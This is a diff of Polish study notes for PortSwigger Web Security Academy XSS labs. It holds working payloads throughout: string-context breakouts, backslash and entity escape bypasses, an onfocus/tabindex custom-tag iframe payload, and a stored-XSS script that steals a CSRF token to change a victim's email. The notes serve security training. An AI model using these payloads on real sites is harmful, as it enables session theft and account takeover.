@@ -180,34 +180,34 @@ src="[]"...>:
 "><script>alert(document.domain)</script>
 ```
 Jeśli jesteśmy wewnątrz stringa w skrypcie:
-```
+```html
 '-alert(document.domain)-'
 ';alert(document.domain)//
 ```
 Jeżeli jest escapowany znak (używany w tym celu backslash) to można dać przed nim \\\\:
 wtedy jeżeli payload jest równy:
-``` 
+```html
 \';alert(document.domain)//
 ```
 po próbie escapowania ' będzie wyglądał tak:
-```
+```html
 \\';alert(document.domain)//
 ```
 a tym samym zamiast escapowania ' zescapowany zostanie backslash, a zatem będzi uznany jako zwykły znak, a nie specjalny.	
 
 Jeżeli escapowany jest również backslash możemy użyć predefiniowanych entity javascripta do znaków np.: \&apos; to ':
-```
+```html
 &apos;-alert(document.domain)-&apos;
 ```
 Można również użyć:
-```
+```html
 ${alert(document.domain)}
 ```
 
 ## Lab: Reflected XSS into HTML context with all tags blocked except custom ones
 1. Właściwość `onfocus` aktywowana jest w momencie gdy zostanie wysłane zapyatbnie na url: `domena.com#<id_elementu>`
 2. Działa ona dla części elementów ale nie wszystkich, dodają jednak atrybut `tabindex=1` (wartość dowolna), działa dla właściwie wszystkich elementów, nawet customowych: 
-```js
+```html
 <iframe src=https://0a5e00cc038379a4c0305dd6005200b1.web-security-academy.net/?search=%3Cxss+onfocus%3Dalert(document.cookie)+id%3Dx+tabindex%3D1%3E#x></iframe>
 
 // <iframe src=https://0a5e00cc038379a4c0305dd6005200b1.web-security-academy.net/?search=<xss onfocus=alert(document.cookie) id=x tabindex=1>#x></iframe>
@@ -225,7 +225,21 @@ https://0a71005c041e3653c08e355d00090032.web-security-academy.net/post?postId=4&
 1. W komentzrzu nie ma rzadniej ochrony przed XSSem, więc możemy dać daowolny skrypt.
 2. Do zmiany maila potrzebny jest jednak token csrf, który zczytujemy ze strony.
 3. Dodajemy setTimeout, aby funkcja wywołała się po sekundzie, kiedy już wszystkie elementy na stronie się załadują.
+```js
+<script>
+    function sendd() {
+        var a = document.getElementsByName("csrf")[0].value;
+        let aaa = new XMLHttpRequest();
+        aaa.open("POST", "https://0a5f00a4035e62ccc0fe0e37006b00ea.web-security-academy.net/my-account/change-email");
+
+        aaa.send("email=test@test.test&csrf=" + a);
+    };
+
+    setTimeout(sendd, 1000)
+</script>
 ```
+
+```html
 <script>
     function sendd() {
         var a = document.getElementsByName("csrf")[0].value;
